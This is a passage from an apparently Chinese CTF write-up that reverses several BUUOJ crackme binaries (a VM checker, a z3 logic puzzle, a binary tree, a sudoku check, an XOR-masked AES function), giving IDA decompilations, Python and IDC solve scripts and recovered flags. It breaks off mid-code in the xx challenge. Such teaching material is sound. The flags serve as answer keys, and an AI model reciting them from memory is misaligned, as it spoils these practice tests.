0x0C, 0x08, 0x04, 0x04, 0x01, 0x05, 0x03, 0x08, 0x03, 0x21, 0x01, 0x0B, 0x08, 0x0B, 0x01, 0x04, 0x09, 0x08, 0x03, 0x20, 0x01, 0x02, 0x51, 0x08, 0x04, 0x24, 0x01, 0x0C, 0x08, 0x0B, 0x01, 0x05, 0x02, 0x08, 0x02, 0x25, 0x01, 0x02, 0x36, 0x08, 0x04, 0x41, 0x01, 0x02, 0x20, 0x08, 0x05, 0x01, 0x01, 0x05, 0x03, 0x08, 0x02, 0x25, 0x01, 0x04, 0x09, 0x08, 0x03, 0x20, 0x01, 0x02, 0x41, 0x08, 0x0C, 0x01, 0x07, 0x22, 0x07, 0x3F, 0x07, 0x34, 0x07, 0x32, 0x07, 0x72, 0x07, 0x33, 0x07, 0x18, 0x07, 0xA7, 0x07, 0x31, 0x07, 0xF1, 0x07, 0x28, 0x07, 0x84, 0x07, 0xC1, 0x07, 0x1E, 0x07, 0x7A] 跟进到 vm_operad 函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879int __cdecl vm_operad(int *a1, int a2)&#123; int result; // eax char Str[200]; // [esp+13h] [ebp-E5h] BYREF char v4; // [esp+DBh] [ebp-1Dh] int v5; // [esp+DCh] [ebp-1Ch] int v6; // [esp+E0h] [ebp-18h] int v7; // [esp+E4h] [ebp-14h] int v8; // [esp+E8h] [ebp-10h] int v9; // [esp+ECh] [ebp-Ch] v9 = 0; v8 = 0; v7 = 0; v6 = 0; v5 = 0; while ( 1 ) &#123; result = v9; if ( v9 &gt;= a2 ) return result; switch ( a1[v9] ) &#123; case 1: Str[v6 + 100] = v4; ++v9; ++v6; ++v8; break; case 2: v4 = a1[v9 + 1] + Str[v8]; v9 += 2; break; case 3: v4 = Str[v8] - LOBYTE(a1[v9 + 1]); v9 += 2; break; case 4: v4 = a1[v9 + 1] ^ Str[v8]; v9 += 2; break; case 5: v4 = a1[v9 + 1] * Str[v8]; v9 += 2; break; case 6: ++v9; break; case 7: if ( Str[v7 + 100] != a1[v9 + 1] ) &#123; printf(&quot;what a shame...&quot;); exit(0); &#125; ++v7; v9 += 2; break; case 8: Str[v5] = v4; ++v9; ++v5; break; case 10: read(Str); ++v9; break; case 11: v4 = Str[v8] - 1; ++v9; break; case 12: v4 = Str[v8] + 1; ++v9; break; default: continue; &#125; &#125;&#125; 根据这里的switch语句来分析 switch里对于各个数值的操作有些与CPU指令相似 原来这就是虚拟机逆向啊 0x01和0x08分别决定计算结果的存储位置 0x02计算加法, 0x03计算减法, 0x04计算异或, 0x05计算乘法 0x0B自增, 0x1C自减 0x0A输入, 0x07用于校验加密后的结果 然后照着代码把虚拟机函数反着写一遍即可获得flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#!/usr/bin/env python3a1 = [0x0A, 0x04, 0x10, 0x08, 0x03, 0x05, 0x01, 0x04, 0x20, 0x08, 0x05, 0x03, 0x01, 0x03, 0x02, 0x08, 0x0B, 0x01, 0x0C, 0x08, 0x04, 0x04, 0x01, 0x05, 0x03, 0x08, 0x03, 0x21, 0x01, 0x0B, 0x08, 0x0B, 0x01, 0x04, 0x09, 0x08, 0x03, 0x20, 0x01, 0x02, 0x51, 0x08, 0x04, 0x24, 0x01, 0x0C, 0x08, 0x0B, 0x01, 0x05, 0x02, 0x08, 0x02, 0x25, 0x01, 0x02, 0x36, 0x08, 0x04, 0x41, 0x01, 0x02, 0x20, 0x08, 0x05, 0x01, 0x01, 0x05, 0x03, 0x08, 0x02, 0x25, 0x01, 0x04, 0x09, 0x08, 0x03, 0x20, 0x01, 0x02, 0x41, 0x08, 0x0C, 0x01]a1.reverse()a2 = [0x07, 0x22, 0x07, 0x3F, 0x07, 0x34, 0x07, 0x32, 0x07, 0x72, 0x07, 0x33, 0x07, 0x18, 0x07, 0xA7, 0x07, 0x31, 0x07, 0xF1, 0x07, 0x28, 0x07, 0x84, 0x07, 0xC1, 0x07, 0x1E, 0x07, 0x7A]cipher = []for _ in range(len(a2)): if a2[_] == 0x07: cipher.append(a2[_+1])cipher.reverse()flag = &quot;&quot;v4 = 0v6 = 0v8 = 0v9 = 0while v9 &lt; len(a1)-1: if a1[v9] == 0x01: v4 = cipher[v6] v6 += 1 v8 += 1 v9 += 1 if a1[v9+1] == 0x02: v8 = v4 - a1[v9] v9 += 2 elif a1[v9+1] == 0x03: v8 = v4 + a1[v9] v9 += 2 elif a1[v9+1] == 0x04: v8 = v4 ^ a1[v9] v9 += 2 elif a1[v9+1] == 0x05: v8 = v4 // a1[v9] v9 += 2 elif a1[v9] == 0x06: v9 += 1 elif a1[v9] == 0x0B: v8 = v4 + 1 v9 += 1 elif a1[v9] == 0x0C: v8 = v4 - 1 v9 += 1 elif a1[v9] == 0x08: v4 = v8 v9 += 1 if a1[v9+1] == 0x02: v8 = v4 - a1[v9] v9 += 2 elif a1[v9+1] == 0x03: v8 = v4 + a1[v9] v9 += 2 elif a1[v9+1] == 0x04: v8 = v4 ^ a1[v9] v9 += 2 elif a1[v9+1] == 0x05: v8 = v4 // a1[v9] v9 += 2 elif a1[v9] == 0x06: v9 += 1 elif a1[v9] == 0x0B: v8 = v4 + 1 v9 += 1 elif a1[v9] == 0x0C: v8 = v4 - 1 v9 += 1 flag += chr(v8)print(&quot;flag&#123;&quot; + flag[::-1] + &quot;&#125;&quot;) flag{757515121f3d478} [GXYCTF2019]simple CPP 链接: https://buuoj.cn/challenges#[GXYCTF2019]simple CPP EXE 64 IDA中 main 函数反编译结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200int __cdecl main(int argc, const char **argv, const char **envp)&#123; bool v3; // si __int64 v4; // rax __int64 v5; // r8 __int64 v6; // r8 unsigned __int8 *v7; // rax unsigned __int8 *v8; // rbx int v9; // er10 __int64 v10; // r11 void **v11; // r9 void **v12; // r8 __int64 v13; // rdi __int64 v14; // r15 __int64 v15; // r12 __int64 v16; // rbp int v17; // ecx unsigned __int8 *v18; // rdx __int64 v19; // rdi __int64 *v20; // r14 __int64 v21; // rbp __int64 v22; // r13 __int64 *v23; // rdi __int64 v24; // r8 __int64 v25; // r12 __int64 v26; // r15 __int64 v27; // rbp __int64 v28; // rdx __int64 v29; // rbp __int64 v30; // rbp __int64 v31; // r10 __int64 v32; // rdi __int64 v33; // r8 bool v34; // dl __int64 v35; // rax void **v36; // rdx __int64 v37; // rax __int64 v38; // r8 __int64 v39; // rax void *v40; // rcx __int64 v42; // [rsp+20h] [rbp-68h] void *Block[2]; // [rsp+30h] [rbp-58h] BYREF unsigned __int64 v44; // [rsp+40h] [rbp-48h] unsigned __int64 v45; // [rsp+48h] [rbp-40h] v3 = 0; v44 = 0i64; v45 = 15i64; LOBYTE(Block[0]) = 0; v4 = sub_7FF69CF519C0(std::cout, &quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;, envp); std::ostream::operator&lt;&lt;(v4, sub_7FF69CF51B90); sub_7FF69CF519C0(std::cout, &quot;Let&#x27;s start our game,Please input your flag:&quot;, v5); sub_7FF69CF51DE0(std::cin, Block); std::ostream::operator&lt;&lt;(std::cout, sub_7FF69CF51B90); if ( v44 - 5 &gt; 0x19 ) &#123; v39 = sub_7FF69CF519C0(std::cout, &quot;Wrong input ,no GXY&#123;&#125; in input words&quot;, v6); std::ostream::operator&lt;&lt;(v39, sub_7FF69CF51B90); goto LABEL_43; &#125; v7 = (unsigned __int8 *)operator new(0x20ui64); v8 = v7; if ( v7 ) &#123; *(_QWORD *)v7 = 0i64; *((_QWORD *)v7 + 1) = 0i64; *((_QWORD *)v7 + 2) = 0i64; *((_QWORD *)v7 + 3) = 0i64; &#125; else &#123; v8 = 0i64; &#125; v9 = 0; if ( v44 ) &#123; v10 = 0i64; do &#123; v11 = Block; if ( v45 &gt;= 0x10 ) v11 = (void **)Block[0]; v12 = &amp;qword_7FF69CF56048; if ( (unsigned __int64)qword_7FF69CF56060 &gt;= 0x10 ) v12 = (void **)qword_7FF69CF56048; v8[v10] = *((byte_0 *)v11 + v10) ^ *((byte_0 *)v12 + v9 % 27); ++v9; ++v10; &#125; while ( v9 &lt; v44 ); &#125; v13 = 0i64; v14 = 0i64; v15 = 0i64; v16 = 0i64; if ( (int)v44 &gt; 30 ) goto LABEL_27; v17 = 0; if ( (int)v44 &lt;= 0 ) goto LABEL_27; v18 = v8; do &#123; v19 = *v18 + v13; ++v17; ++v18; switch ( v17 ) &#123; case 8: v16 = v19; goto LABEL_23; case 16: v15 = v19; goto LABEL_23; case 24: v14 = v19;LABEL_23: v19 = 0i64; break; case 32: sub_7FF69CF519C0(std::cout, &quot;ERRO,out of range&quot;, (unsigned int)v44); exit(1); &#125; v13 = v19 &lt;&lt; 8; &#125; while ( v17 &lt; (int)v44 ); if ( v16 ) &#123; v20 = (__int64 *)operator new(0x20ui64); *v20 = v16; v20[1] = v15; v20[2] = v14; v20[3] = v13; goto LABEL_28; &#125;LABEL_27: v20 = 0i64;LABEL_28: v42 = v20[2]; v21 = v20[1]; v22 = *v20; v23 = (__int64 *)operator new(0x20ui64); if ( IsDebuggerPresent() ) &#123; sub_7FF69CF519C0(std::cout, &quot;Hi , DO not debug me !&quot;, v24); Sleep(0x7D0u); exit(0); &#125; v25 = v21 &amp; v22; *v23 = v21 &amp; v22; v26 = v42 &amp; ~v22; v23[1] = v26; v27 = ~v21; v28 = v42 &amp; v27; v23[2] = v42 &amp; v27; v29 = v22 &amp; v27; v23[3] = v29; if ( v26 != 0x11204161012i64 ) &#123; v23[1] = 0i64; v26 = 0i64; &#125; v30 = v26 | v25 | v28 | v29; v31 = v20[1]; v32 = v20[2]; v33 = v28 &amp; *v20 | v32 &amp; (v25 | v31 &amp; ~*v20 | ~(v31 | *v20)); v34 = 0; if ( v33 == 0x8020717153E3013i64 ) v34 = v30 == 0x3E3A4717373E7F1Fi64; if ( (v30 ^ v20[3]) == 0x3E3A4717050F791Fi64 ) v3 = v34; if ( (v26 | v25 | v31 &amp; v32) == (~*v20 &amp; v32 | 0xC00020130082C0Ci64) &amp;&amp; v3 ) &#123; v35 = sub_7FF69CF519C0(std::cout, &quot;Congratulations!flag is GXY&#123;&quot;, v33); v36 = Block; if ( v45 &gt;= 0x10 ) v36 = (void **)Block[0]; v37 = sub_7FF69CF51FD0(v35, v36, v44); sub_7FF69CF519C0(v37, &quot;&#125;&quot;, v38); j_j_free(v8); &#125; else &#123; sub_7FF69CF519C0(std::cout, &quot;Wrong answer!try again&quot;, v33); j_j_free(v8); &#125;LABEL_43: if ( v45 &gt;= 0x10 ) &#123; v40 = Block[0]; if ( v45 + 1 &gt;= 0x1000 ) &#123; v40 = (void *)*((_QWORD *)Block[0] - 1); if ( (unsigned __int64)(Block[0] - v40 - 8) &gt; 0x1F ) invalid_parameter_noinfo_noreturn(); &#125; j_j_free(v40); &#125; return 0;&#125; 主函数一堆的运算过程看起来有点无从下手 仔细分析一遍之后可以得出下面的流程 12345678910111213141516171819202122v12 &#x3D; &quot;i_will_check_is_debug_or_not&quot;v8 &#x3D; plain ^ v12v16 &#x3D; v8[:8]v15 &#x3D; v8[8:16]v14 &#x3D; v8[16:24]v13 &#x3D; v8[24:]v25 &#x3D; v15 &amp; v16v26 &#x3D; v14 &amp; ~v16v27 &#x3D; ~v15v28 &#x3D; v14 &amp; ~v15v29 &#x3D; v16 &amp; ~v15v23[0] &#x3D; v15 &amp; v16v23[1] &#x3D; v14 &amp; ~v16v23[2] &#x3D; v14 &amp; ~v15v23[3] &#x3D; v16 &amp; ~v15v14 &amp; ~v16 &#x3D;&#x3D; 0x11204161012v30 &#x3D; v25 | v26 | v28 | v29 &#x3D;&#x3D; 0x3E3A4717373E7F1Fv31 &#x3D; v15v32 &#x3D; v14v33 &#x3D; v28 &amp; v16 | v32 &amp; (v25 | v31 &amp; ~v16 | ~(v31 | v16)) &#x3D;&#x3D; 0x8020717153E3013v30 ^ v13 &#x3D;&#x3D; 0x3E3A4717050F791F(v26 | v25 | v31 &amp; v32) &#x3D;&#x3D; (~v16 &amp; v32 | 0xC00020130082C0C) 其中v12需要使用动调来获得内容 1v8[v10] = *((byte_0 *)v11 + v10) ^ *((byte_0 *)v12 + v9 % 27); 同时我们可以根据这条代码来推测flag内容的长度应该为27 Z3解方程组 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python3from z3 import *from Crypto.Util.number import *v13, v14, v15, v16 = BitVecs(&quot;v13 v14 v15 v16&quot;, 64)s = Solver()s.add(v14 &amp; ~v16 == 0x11204161012)s.add((v15 &amp; v16)|(v14 &amp; ~v16)|(v14 &amp; ~v15)|(v16 &amp; ~v15) == 0x3E3A4717373E7F1F)s.add(((v14 &amp; ~v15) &amp; v16)| (v14 &amp; (v15 &amp; v16 | v15 &amp; ~v16 | ~(v15 | v16))) == 0x8020717153E3013)s.add(0x3E3A4717373E7F1F ^ v13 == 0x3E3A4717050F791F)s.add(((v14 &amp; ~v16) | (v15 &amp; v16) | (v15 &amp; v14)) == (~v16 &amp; v14 | 0xC00020130082C0C))s.check()m = s.model()&quot;&quot;&quot;print(m)[v13 = 842073600, v16 = 4483973367147818765, v14 = 577031497978884115, v15 = 864693882343402508]&quot;&quot;&quot;cipher = b&quot;&quot;v12 = &quot;i_will_check_is_debug_or_no&quot;flag = &quot;flag&#123;&quot;m = [4483973367147818765, 864693882343402508, 577031497978884115, 842073600]for _ in m: cipher += long_tobyte_0s(_)print(cipher)for _ in range(len(cipher)): flag += chr(cipher[_] ^ ord(v12[_]))flag += &quot;&#125;&quot;print(flag) 貌似是因为多解的原因 导致最后得到的flag不正确 所以比赛时给出了flag的第二部分&quot;e!P0or_a&quot; flag{We1l_D0ne!P0or_algebra_am_i} [WUSTCTF2020]level4 链接: https://buuoj.cn/challenges#[WUSTCTF2020]level4 ELF 64 IDA中 main 函数反编译结果如下 123456789101112131415int __cdecl main(int argc, const char **argv, const char **envp)&#123; puts(&quot;Practice my Data Structure code.....&quot;); puts(&quot;Typing....Struct.....char....*left....*right............emmmmm...OK!&quot;); init(&quot;Typing....Struct.....char....*left....*right............emmmmm...OK!&quot;, argv); puts(&quot;Traversal!&quot;); printf(&quot;Traversal type 1:&quot;); type1(&amp;unk_601290); printf(&quot;\\nTraversal type 2:&quot;); type2(&amp;unk_601290); printf(&quot;\\nTraversal type 3:&quot;); puts(&quot; //type3(&amp;x[22]); No way!&quot;); puts(&amp;byte_400A37); return 0;&#125; 二叉树中序遍历 123456789101112__int64 __fastcall type1(char *a1)&#123; __int64 result; // rax if ( a1 ) &#123; type1(*((_QWORD *)a1 + 1)); putchar(*a1); result = type1(*((_QWORD *)a1 + 2)); &#125; return result;&#125; 二叉树后序遍历 123456789101112int __fastcall type2(char *a1)&#123; int result; // eax if ( a1 ) &#123; type2(*((_QWORD *)a1 + 1)); type2(*((_QWORD *)a1 + 2)); result = putchar(*a1); &#125; return result;&#125; 结合输出结果来看 先序遍历的输出结果应该就是flag 这里不会写转换脚本 直接在IDA里面动调看unk_601290的数据结构了 数据+8Byte 是左子节点的地址 数据+16Byte 是右子节点的地址 flag{This_IS_A_7reE} [GUET-CTF2019]number_game 链接: https://buuoj.cn/challenges#[GUET-CTF2019]number_game ELF 64 IDA中 main 函数反编译结果如下 12345678910111213141516171819202122232425262728293031323334353637unsigned __int64 __fastcall main(int a1, char **a2, char **a3)&#123; _QWORD *v4; // [rsp+8h] [rbp-38h] __int64 v5; // [rsp+10h] [rbp-30h] BYREF __int16 v6; // [rsp+18h] [rbp-28h] __int64 v7; // [rsp+20h] [rbp-20h] BYREF __int16 v8; // [rsp+28h] [rbp-18h] char v9; // [rsp+2Ah] [rbp-16h] unsigned __int64 v10; // [rsp+38h] [rbp-8h] v10 = __readfsqword(0x28u); v5 = 0LL; v6 = 0; v7 = 0LL; v8 = 0; v9 = 0; __isoc99_scanf(&quot;%s&quot;, &amp;v5); if ( (unsigned int)sub_4006D6((const char *)&amp;v5) ) &#123; v4 = sub_400758((__int64)&amp;v5, 0, 0xAu); sub_400807((__int64)v4, (__int64)&amp;v7); v9 = 0; sub_400881((char *)&amp;v7); if ( (unsigned int)sub_400917() ) &#123; puts(&quot;TQL!&quot;); printf(&quot;flag&#123;&quot;); printf(&quot;%s&quot;, (const char *)&amp;v5); puts(&quot;&#125;&quot;); &#125; else &#123; puts(&quot;your are cxk!!&quot;); &#125; &#125; return __readfsqword(0x28u) ^ v10;&#125; 12345678910111213141516171819202122__int64 __fastcall sub_4006D6(const char *a1)&#123; __int64 result; // rax int i; // [rsp+1Ch] [rbp-4h] if ( strlen(a1) == 10 ) &#123; for ( i = 0; i &lt;= 9; ++i ) &#123; if ( a1[i] &gt; 52 || a1[i] &lt;= 47 ) goto LABEL_2; &#125; result = 1LL; &#125; else &#123;LABEL_2: puts(&quot;Wrong!&quot;); result = 0LL; &#125; return result;&#125; 函数sub_4006D6要求输入的字符串长度为10且字符集为&quot;01234&quot; 通过控制输入, 动态调试sub_400807得到重新排序之后的字符串 因为实在懒得看代码了, 曲线救国 123450123401234233144002100112233443140420213 根据两组输入输出则可以得出解密序列为 1seq = [6, 3, 8, 1, 5, 7, 9, 0, 2, 4] 1234567891011121314151617__int64 __fastcall sub_400881(char *a1)&#123; __int64 result; // rax byte_601062 = *a1; byte_601067 = a1[1]; byte_601069 = a1[2]; byte_60106B = a1[3]; byte_60106E = a1[4]; byte_60106F = a1[5]; byte_601071 = a1[6]; byte_601072 = a1[7]; byte_601076 = a1[8]; result = (unsigned __int8)a1[9]; byte_601077 = a1[9]; return result;&#125; 12345678910111213141516171819202122232425.data:0000000000601060 unk_601060 db 31h ; 1.data:0000000000601061 db 34h ; 4.data:0000000000601062 byte_601062 db 23h ; DATA XREF: sub_400881+F↑w.data:0000000000601063 db 32h ; 2.data:0000000000601064 db 33h ; 3.data:0000000000601065 db 33h ; 3.data:0000000000601066 db 30h ; 0.data:0000000000601067 byte_601067 db 23h ; DATA XREF: sub_400881+1D↑w.data:0000000000601068 db 31h ; 1.data:0000000000601069 byte_601069 db 23h ; DATA XREF: sub_400881+2B↑w.data:000000000060106A db 30h ; 0.data:000000000060106B byte_60106B db 23h ; DATA XREF: sub_400881+39↑w.data:000000000060106C db 32h ; 2.data:000000000060106D db 33h ; 3.data:000000000060106E byte_60106E db 23h ; DATA XREF: sub_400881+47↑w.data:000000000060106F byte_60106F db 23h ; DATA XREF: sub_400881+55↑w.data:0000000000601070 db 33h ; 3.data:0000000000601071 byte_601071 db 23h ; DATA XREF: sub_400881+63↑w.data:0000000000601072 byte_601072 db 23h ; DATA XREF: sub_400881+71↑w.data:0000000000601073 db 30h ; 0.data:0000000000601074 db 34h ; 4.data:0000000000601075 db 32h ; 2.data:0000000000601076 byte_601076 db 23h ; DATA XREF: sub_400881+7F↑w.data:0000000000601077 byte_601077 db 23h ; DATA XREF: sub_400881+8D↑w.data:0000000000601078 db 31h ; 1 可以看到通过v7赋值的地址都是恰好是空值的位置, 则这里是在填空 1234567891011121314151617181920212223__int64 sub_400917()&#123; unsigned int v1; // [rsp+0h] [rbp-10h] int i; // [rsp+4h] [rbp-Ch] int j; // [rsp+8h] [rbp-8h] int k; // [rsp+Ch] [rbp-4h] v1 = 1; for ( i = 0; i &lt;= 4; ++i ) &#123; for ( j = 0; j &lt;= 4; ++j ) &#123; for ( k = j + 1; k &lt;= 4; ++k ) &#123; if ( *((byte_0 *)&amp;unk_601060 + 5 * i + j) == *((byte_0 *)&amp;unk_601060 + 5 * i + k) ) v1 = 0; if ( *((byte_0 *)&amp;unk_601060 + 5 * j + i) == *((byte_0 *)&amp;unk_601060 + 5 * k + i) ) v1 = 0; &#125; &#125; &#125; return v1;&#125; 看到这里就差不多明白了 横纵不能出现相同的数字, 那么这个程序就是个数独游戏了 且数独的布局如下 123456sudoku = [1, 4, X, 2, 3,3, 0, X, 1, X,0, X, 2, 3, X,X, 3, X, X, 0,4, 2, X, X, 1] 解出后得出序列为 1cipher = [0, 4, 2, 1, 4, 2, 1, 4, 3, 0] 1234567#!/usr/bin/env python3cipher = [0, 4, 2, 1, 4, 2, 1, 4, 3, 0]seq = [6, 3, 8, 1, 5, 7, 9, 0, 2, 4]flag = [0 for _ in range(10)]for _ in range(len(cipher)): flag[_] = str(cipher[seq[_]])print(&quot;flag&#123;&quot;+&quot;&quot;.join(flag)+&quot;&#125;&quot;) flag{1134240024} [GWCTF 2019]re3 链接: https://buuoj.cn/challenges#[GWCTF 2019]re3 ELF 64 IDA中 main 函数反编译结果如下 12345678910111213141516171819void __fastcall __noreturn main(int a1, char **a2, char **a3)&#123; int i; // [rsp+8h] [rbp-48h] char s[40]; // [rsp+20h] [rbp-30h] BYREF unsigned __int64 v5; // [rsp+48h] [rbp-8h] v5 = __readfsqword(0x28u); __isoc99_scanf(&quot;%39s&quot;, s); if ( (unsigned int)strlen(s) != 32 ) &#123; puts(&quot;Wrong!&quot;); exit(0); &#125; mprotect(&amp;dword_400000, 0xF000uLL, 7); for ( i = 0; i &lt;= 223; ++i ) *((byte_0 *)sub_402219 + i) ^= 0x99u; sub_40207B(&amp;unk_603170); sub_402219(s);&#125; 12for ( i = 0; i &lt;= 223; ++i ) *((byte_0 *)sub_402219 + i) ^= 0x99u; 注意看着一段代码 这里在对函数sub_402219的内容进行异或运算 而sub_402219的内容如下 12345678910111213141516171819.text:0000000000402219 sub_402219 proc near ; CODE XREF: main+CA↑p.text:0000000000402219 ; DATA XREF: main:loc_40217C↑o.text:0000000000402219 ; __unwind &#123;.text:0000000000402219 int 3 ; Trap to Debugger.text:0000000000402219 sub_402219 endp.text:0000000000402219.text:0000000000402219 ; ---------------------------------------------------------------------------.text:000000000040221A dw 10D1h, 0D17Ch, 7518h.text:0000000000402220 dq 812410D199999969h, 0BC9D12D1FD666666h, 61DC10D1999999B1h.text:0000000000402220 dq 6666A91C14D159A8h, 10D199F9A8E92766h, 12D1666671BA715Eh.text:0000000000402220 dq 1C14D1666666810Ch, 0D14F10D1666666A9h, 0D166666E9E715E10h.text:0000000000402220 dq 14D1666666811C12h, 6666A91C14D189C9h, 715E10D14F10D166h.text:0000000000402220 dq 66B11C5E66666F73h, 1C5E999999986666h, 99999999666666B5h.text:0000000000402220 dq 666666B51C12A372h, 66811C12D149FAD1h, 892F964998D16666h.text:0000000000402220 dq 1D1666666B51C12h, 0A199F9A939192F96h, 6666B11C5E93ED5Bh.text:0000000000402220 dq 0B51C1A9999999966h, 66B5241A98666666h, 0B11C1224E7866666h.text:0000000000402220 dq 0FD61D412D1666666h, 999999B1BC95AAD1h, 5066667AC0719CEDh.text:0000000000402220 dq 801F0F5Ah.text:0000000000402300 那么可以看到函数中内容无法被IDA解析, 所以被认为是数据 所以我们需要使用IDC脚本来对这部分数据进行还原 12345678910#include &lt;idc.idc&gt;static main()&#123; auto addr = 0x402219; auto i; for (i = 0; i &lt;= 223; ++i) &#123; PatchByte(addr+i, Byte(addr+i)^0x99); &#125;&#125; 先全部转为数据, 再强制转为代码, 最后再创建函数, 且main函数里nop掉那段循环异或的代码 同时main函数需要包含loc_402205, loc_40220F这两段代码, 操作同上 还原之后的函数main 1234567891011121314151617181920void __fastcall __noreturn main(int a1, char **a2, char **a3)&#123; char s[40]; // [rsp+20h] [rbp-30h] BYREF unsigned __int64 v4; // [rsp+48h] [rbp-8h] v4 = __readfsqword(0x28u); __isoc99_scanf(&quot;%39s&quot;, s); if ( (unsigned int)strlen(s) != 32 ) &#123; puts(&quot;Wrong!&quot;); exit(0); &#125; mprotect(&amp;dword_400000, 0xF000uLL, 7); sub_40207B((__int64)&amp;unk_603170); if ( (unsigned int)sub_402219((__int64)s) ) puts(&quot;Correct!&quot;); else puts(&quot;Wrong!&quot;); exit(0);&#125; 先分析函数sub_40207B 12345678910111213141516unsigned __int64 __fastcall sub_40207B(__int64 a1)&#123; char v2[16]; // [rsp+10h] [rbp-50h] BYREF __int64 v3; // [rsp+20h] [rbp-40h] BYREF __int64 v4; // [rsp+30h] [rbp-30h] BYREF __int64 v5; // [rsp+40h] [rbp-20h] BYREF unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); sub_401CF9(&amp;BASE64_table_603120, 0x40uLL, (__int64)v2); sub_401CF9(&amp;CRC32_table_603100, 0x14uLL, (__int64)&amp;v3); sub_401CF9(&amp;Prime_Constants_char_6030C0, 0x35uLL, (__int64)&amp;v4); sub_401CF9(MD5_Constants_4025C0, 0x100uLL, (__int64)&amp;v5); sub_401CF9(v2, 0x40uLL, a1); return __readfsqword(0x28u) ^ v6;&#125; BASE64_table_603120经过函数sub_401CF9的运行之后结果保存于v2 v2经过函数sub_401CF9的运行之后结果保存于a1, 即unk_603170 代码过于复杂, 动调得到unk_603170的内容 123_603170 = [0xCB, 0x8D, 0x49, 0x35, 0x21, 0xB4, 0x7A, 0x4C, 0xC1, 0xAE, 0x7E, 0x62, 0x22, 0x92, 0x66, 0xCE] 分析sub_402219 12345678910111213141516171819__int64 __fastcall sub_402219(__int64 a1)&#123; unsigned int v2; // [rsp+18h] [rbp-D8h] int i; // [rsp+1Ch] [rbp-D4h] char v4[200]; // [rsp+20h] [rbp-D0h] BYREF unsigned __int64 v5; // [rsp+E8h] [rbp-8h] v5 = __readfsqword(0x28u); sub_400A71((__int64)v4, (__int64)&amp;unk_603170); sub_40196E((__int64)v4, a1); sub_40196E((__int64)v4, a1 + 16); v2 = 1; for ( i = 0; i &lt;= 31; ++i ) &#123; if ( *(byte_0 *)(i + a1) != qword_6030A0[i] ) v2 = 0; &#125; return v2;&#125; sub_400A71处理unk_603170 继续跟进看到一个名为RijnDael_AES_LONG_4023A0数据段, 那么基本可以判断这是一个AES加密程序了 sub_40196E也就是用于加密用户所输入的字符串, 且加密模式为ECB(32字节的数据分两次单独加密), 最后的密文存于qword_6030A0 12345_6030A0 = [0xBC, 0x0A, 0xAD, 0xC0, 0x14, 0x7C, 0x5E, 0xCC, 0xE0, 0xB1, 0x40, 0xBC, 0x9C, 0x51, 0xD5, 0x2B, 0x46, 0xB2, 0xB9, 0x43, 0x4D, 0xE5, 0x32, 0x4B, 0xAD, 0x7F, 0xB4, 0xB3, 0x9C, 0xDB, 0x4B, 0x5B] 123456789101112131415161718#!/usr/bin/env python3from Crypto.Cipher import AES_603170 = [0xCB, 0x8D, 0x49, 0x35, 0x21, 0xB4, 0x7A, 0x4C, 0xC1, 0xAE, 0x7E, 0x62, 0x22, 0x92, 0x66, 0xCE]_6030A0 = [0xBC, 0x0A, 0xAD, 0xC0, 0x14, 0x7C, 0x5E, 0xCC, 0xE0, 0xB1, 0x40, 0xBC, 0x9C, 0x51, 0xD5, 0x2B, 0x46, 0xB2, 0xB9, 0x43, 0x4D, 0xE5, 0x32, 0x4B, 0xAD, 0x7F, 0xB4, 0xB3, 0x9C, 0xDB, 0x4B, 0x5B]cipher = &quot;&quot;for _ in _6030A0: cipher += chr(_)key = &quot;&quot;for _ in _603170: key += chr(_)aes = AES.new(key.encode(&quot;ISO-8859-1&quot;), AES.MODE_ECB)print(aes.decrypt(cipher.encode(&quot;ISO-8859-1&quot;)).decode()) flag{924a9ab2163d390410d0a1f670} [2019红帽杯]xx 链接: https://buuoj.cn/challenges#[2019红帽杯]xx EXE 64 IDA中 main 函数反编译结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rbx __int64 v4; // rax __int128 *v5; // rax __int64 v6; // r11 __int128 *v7; // r14 int v8; // edi __int128 *v9; // rsi char v10; // r10 int v11; // edx __int64 v12; // r8 unsigned __int64 v13; // rcx __int64 v14; // rcx unsigned __int64 v15; // rax unsigned __int64 i; // rax __int64 v17; // rax size_t v18; // rsi _BYTE *v19; // rbx _BYTE *v20; // r9 int v21; // er11 char *v22; // r8 __int64 v23; // rcx char v24; // al __int64 v25; // r9 __int64 v26; // rdx __int64 v27; // rax size_t Size; // [rsp+20h] [rbp-48h] BYREF __int128 v30; // [rsp+28h] [rbp-40h] BYREF int v31; // [rsp+38h] [rbp-30h] int v32; // [rsp+3Ch] [rbp-2Ch] int Code[4]; // [rsp+40h] [rbp-28h] BYREF int v34; // [rsp+50h] [rbp-18h] *(_OWORD *)Code = 0i64; v34 = 0; sub_1400018C0(std::cin, argv, Code); v3 = -1i64; v4 = -1i64; do ++v4; while ( *((_BYTE *)Code + v4) ); if ( v4 != 19 ) &#123; sub_140001620(std::cout, &quot;error\\n&quot;); _exit((int)Code); &#125; v5 = (__int128 *)operator new(5ui64); v6 = *(_QWORD *)&amp;::Code; v7 = v5; v8 = 0; v9 = v5; do &#123; v10 = *((_BYTE *)v9 + (char *)Code - (char *)v5); v11 = 0; *(_BYTE *)v9 = v10; v12 = 0i64; v13 = -1i64; do ++v13; while ( *(_BYTE *)(v6 + v13) ); if ( v13 ) &#123; do &#123; if ( v10 == *(_BYTE *)(v6 + v12) ) break; ++v11; ++v12; &#125; while ( v11 &lt; v13 ); &#125; v14 = -1i64; do ++v14; while ( *(_BYTE *)(v6 + v14) ); if ( v11 == v14 ) _exit(v6); v9 = (__int128 *)((char *)v9 + 1); &#125; while ( (char *)v9 - (char *)v5 &lt; 4 ); *((_BYTE *)v5 + 4) = 0; 